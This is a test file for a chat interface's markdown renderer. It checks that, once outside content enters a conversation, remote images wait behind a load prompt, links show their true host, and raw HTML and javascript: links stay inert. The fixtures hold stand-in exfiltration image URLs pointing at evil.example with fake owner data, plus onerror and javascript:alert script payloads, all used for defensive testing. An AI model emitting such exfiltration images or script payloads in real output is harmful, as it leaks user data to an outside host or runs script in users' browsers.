import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { TextMessagePartProvider } from "@assistant-ui/react";
import { installDom } from "@/test/dom";
import { markOutsideContent, resetImageGateForTests } from "@/lib/imageGate";
import { ImageGateScope, MarkdownText } from "./markdown-text";

let restore: (() => void) | undefined;
const mounted = new Set<{ root: Root; host: HTMLElement }>();
afterEach(async () => {
  for (const { root, host } of mounted) { await act(async () => root.unmount()); host.remove(); }
  mounted.clear();
  resetImageGateForTests();
  restore?.();
  restore = undefined;
});

/** `threadId` undefined renders outside any conversation (a shared or unknown view). */
async function render(text: string, threadId?: string) {
  restore ??= installDom();
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  mounted.add({ root, host });
  await act(async () => root.render(
    <ImageGateScope threadId={threadId}>
      <TextMessagePartProvider text={text}><MarkdownText /></TextMessagePartProvider>
    </ImageGateScope>,
  ));
  return { host };
}

const ADDRESS = "https://evil.example/leak?d=FAKE-OWNER-DATA-1234";
const IMAGE = `![chart](${ADDRESS})`;
const noRemoteLoad = (host: HTMLElement) => {
  expect(host.querySelectorAll("img, picture, source, video, iframe, object, embed")).toHaveLength(0);
  expect(host.querySelectorAll("[src], [srcset], [poster], [data]")).toHaveLength(0);
};
const buttonIn = (host: ParentNode, label: string) => [...host.querySelectorAll("button")].find((node) => node.textContent?.trim() === label)!;

test("a chat that has touched no outside content loads its images as usual", async () => {
  const { host } = await render(IMAGE, "clean-chat");
  expect(host.querySelector("img")?.getAttribute("src")).toBe(ADDRESS);
  expect(host.textContent).not.toContain("Load this image?");
});

test("once outside content has entered, an image renders no src and asks first, with its full address", async () => {
  markOutsideContent("tainted-chat");
  const { host } = await render(`${IMAGE}\n\n![ref image][r]\n\n[r]: https://evil.example:8443/ref?d=FAKE-OWNER-DATA-1234`, "tainted-chat");
  noRemoteLoad(host);
  expect(host.textContent).toContain("Image not loaded: chart (evil.example)");
  expect(host.textContent).toContain("Load this image?");
  expect(host.textContent).toContain(ADDRESS);
  expect(host.textContent).toContain("https://evil.example:8443/ref?d=FAKE-OWNER-DATA-1234");
  expect(host.textContent).toContain("Loading the image sends its full address to evil.example.");
  expect(host.querySelector('[role="group"]')?.getAttribute("aria-label")).toBe(`Load this image? ${ADDRESS}`);
});

test("the mark applies live: an image already on screen in a clean chat becomes a prompt the moment outside content enters", async () => {
  const { host } = await render(IMAGE, "turning-chat");
  expect(host.querySelector("img")).not.toBeNull();
  await act(async () => markOutsideContent("turning-chat"));
  noRemoteLoad(host);
  expect(host.textContent).toContain("Load this image?");
});

test("Load allows that one address, not its site or the other images; Not now keeps it as text", async () => {
  markOutsideContent("ask-chat");
  const second = "https://evil.example/leak?d=SECOND";
  const { host } = await render(`${IMAGE}\n\n![other](${second})`, "ask-chat");
  const groups = () => [...host.querySelectorAll('[role="group"]')];
  expect(groups()).toHaveLength(2);

  await act(async () => buttonIn(groups()[0]!, "Load").click());
  expect(host.querySelectorAll("img")).toHaveLength(1);
  expect(host.querySelector("img")?.getAttribute("src")).toBe(ADDRESS);
  expect(groups()).toHaveLength(1);
  expect(host.textContent).toContain(second);

  await act(async () => buttonIn(groups()[0]!, "Not now").click());
  expect(host.querySelectorAll("img")).toHaveLength(1);
  expect(groups()).toHaveLength(0);
  expect(host.textContent).toContain("Image not loaded: other (evil.example)");
});

test("one conversation's mark and allowances do not reach another", async () => {
  markOutsideContent("marked-chat");
  const { host } = await render(IMAGE, "other-chat");
  expect(host.querySelector("img")?.getAttribute("src")).toBe(ADDRESS);
});

test("outside any conversation (a shared or unknown view) every image asks first", async () => {
  const { host } = await render(IMAGE);
  noRemoteLoad(host);
  expect(host.textContent).toContain("Load this image?");
});

test("raw HTML never becomes an element, marked or not", async () => {
  const html = `<img src="${ADDRESS}" onerror="alert(1)">\n\n<picture><source srcset="${ADDRESS}"></picture>`;
  for (const threadId of ["clean-html", "marked-html"]) {
    if (threadId === "marked-html") markOutsideContent(threadId);
    const { host } = await render(html, threadId);
    noRemoteLoad(host);
    expect(host.textContent).toContain('<img src="https://evil.example/leak');
  }
});

test("a link shows its full host beside the label, so the label cannot hide where it goes", async () => {
  const { host } = await render([
    `[docs](https://evil.example:8443/path?d=1)`,
    `[good.example](https://evil.example/x)`,
    `see https://bare.example/a/b and www.auto.example`,
  ].join("\n\n"), "clean-links");
  const anchors = [...host.querySelectorAll("a")];
  const docs = anchors.find((anchor) => anchor.textContent === "docs")!;
  expect(docs.getAttribute("href")).toBe("https://evil.example:8443/path?d=1");
  expect(docs.nextElementSibling?.textContent).toBe("(evil.example:8443)");
  const disguised = anchors.find((anchor) => anchor.textContent === "good.example")!;
  expect(disguised.nextElementSibling?.textContent).toBe("(evil.example)");
  // A label that already is the address or the host says it once.
  const bare = anchors.find((anchor) => anchor.getAttribute("href")?.startsWith("https://bare.example"))!;
  expect(bare.nextElementSibling?.textContent).not.toBe("(bare.example)");
  for (const anchor of anchors) {
    expect(anchor.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(anchor.getAttribute("referrerpolicy")).toBe("no-referrer");
  }
});

test("a link that is not a web address is plain text with nothing to open", async () => {
  const { host } = await render(["[run](javascript:alert(1))", "[mail](mailto:a@b.example)", "[jump](#section)"].join("\n\n"), "clean-plain");
  expect(host.querySelectorAll("a")).toHaveLength(0);
  for (const word of ["run", "mail", "jump"]) expect(host.textContent).toContain(word);
});
